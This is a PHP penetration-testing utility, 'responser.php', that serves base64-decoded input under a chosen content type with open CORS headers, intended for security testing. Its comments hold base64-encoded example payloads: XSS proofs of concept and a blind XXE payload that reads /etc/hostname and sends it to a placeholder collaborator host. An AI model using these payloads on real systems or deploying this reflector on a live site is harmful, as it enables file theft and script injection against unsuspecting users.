<?php
########################################################
# A PHP tool to serve arbitrary content,               #
# using your choice of content-type header             #
# Written by Andy Tyler (@ticarpi)                     #
# Please use responsibly...                            #
# Software URL: https://github.com/ticarpi/ticwebtools #
########################################################

###################
# Common options: #
###################
#
# HTML: Test tags
# responser.php?c=html&b=PGgxPkl0IHdvcmtzITwvaDE%2B
#
# JS: XSS POC
# responser.php?c=js&b=YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ%3D%3D
#
# XML: SVG XSS POC
# responser.php?c=xml&b=PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI%2FPjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI%2BPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIzMDAiIGhlaWdodD0iMTAwIiBzdHlsZT0iZmlsbDpyZ2IoMCwwLDI1NSk7c3Ryb2tlLXdpZHRoOjM7c3Ryb2tlOnJnYigwLDAsMCkiIC8%2BPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmFsZXJ0KCJYU1MiKTs8L3NjcmlwdD48L3N2Zz4%3D
#
# XML: XXE Blind File Read
# responser.php?c=xml&b=PCFFTlRJVFkgJSBmaWxlIFNZU1RFTSAiZmlsZTovLy9ldGMvaG9zdG5hbWUiPgo8IUVOVElUWSAlIGV2YWwgIjwhRU5USVRZICYjeDI1OyBleGZpbHRyYXRlIFNZU1RFTSAnaHR0cHM6Ly9DT0xMQUJPUkFUT1IvP3g9JWZpbGU7Jz4iPgolZXZhbDsKJWV4ZmlsdHJhdGU7
#

$bval = $_GET['b'];
$cval = $_GET['c'];
header('Access-Control-Allow-Origin: *');
	if (isset($cval)) {
		if ($cval == 'html') {
			header('Content-type: text/html; charset=UTF-8');
		} elseif ($cval == 'json') {
			header('Content-type: application/json; charset=UTF-8');
		} elseif ($cval == 'xml') {
			header('Content-type: application/xml; charset=UTF-8');
		} elseif ($cval == 'csv') {
			header('Content-type: text/csv; charset=UTF-8');
		} elseif ($cval == 'js') {
			header('Content-type: text/javascript; charset=UTF-8');
		} elseif ($cval == 'zip') {
			header('Content-type: application/zip; charset=UTF-8');
		} else {
			header('Content-type: text/plain; charset=UTF-8');
		}
	} else {
		header('Content-type: text/plain; charset=UTF-8');
	};
	if (isset($bval)) {
		echo(base64_decode($bval));
	} else {
		header('Content-type: text/html; charset=UTF-8');
		echo("<html>\n<body>\n<h2>Welcome to responser.php</h2>\n<p> by @ticarpi</p>\n<p>This is a tool to serve content based on your input.</p>\n<p>Use the URL parameters:<br />* c for Content-Type<br />\n* b for Base64 data to interpret</p>\n<p><strong>Example:</strong><br />\nresponser.php?c=html&b=PGgxPkl0IHdvcmtzITwvaDE%2B<br />\n(See more examples in the PHP source code)<br /><br />\n<strong>Valid Content-Type options:</strong><br />\nhtml/json/xml/csv/js/zip (defaults to plain if not set)</p>\n============================\n<p>Build your Base64 content in the browser console using:<br />\nencodeURIComponent(btoa('Your content here'))</p>\n============================\n<p>For simple payloads type them below for auto-encoding:<br /><br />\n<label for=\"contenttype\">Choose a content type:</label>\n<select name=\"contenttype\" id=\"contenttype\">\n  <option value=\"txt\">Plain text</option>\n  <option value=\"html\">HTML</option>\n  <option value=\"json\">JSON</option>\n  <option value=\"xml\">XML</option>\n  <option value=\"csv\">CSV</option>\n  <option value=\"js\">JavaScript</option>\n  <option value=\"zip\">Zip file</option>\n</select>\n<br /><br /><textarea id=\"text-input\">test</textarea></label>\n<br /><br />\n<button onclick=\"genURL()\">Click me</button>\n<script>\nfunction genURL() {\n  b64input = encodeURIComponent(btoa(document.getElementById('text-input').value));\n  contenttype = document.getElementById('contenttype').value;\n  baseU = document.location.href;\n  newU = baseU+'?c='+contenttype+'&b='+b64input;\n  newAtag.href = newU;\n  newAtag.innerHTML = newU;\n  document.getElementById('adest').appendChild(newAtag);\n}\n</script>\n<div id='adest'><a id=newAtag></a></div>\n============================\n</body>\n</html>");
	};
?>


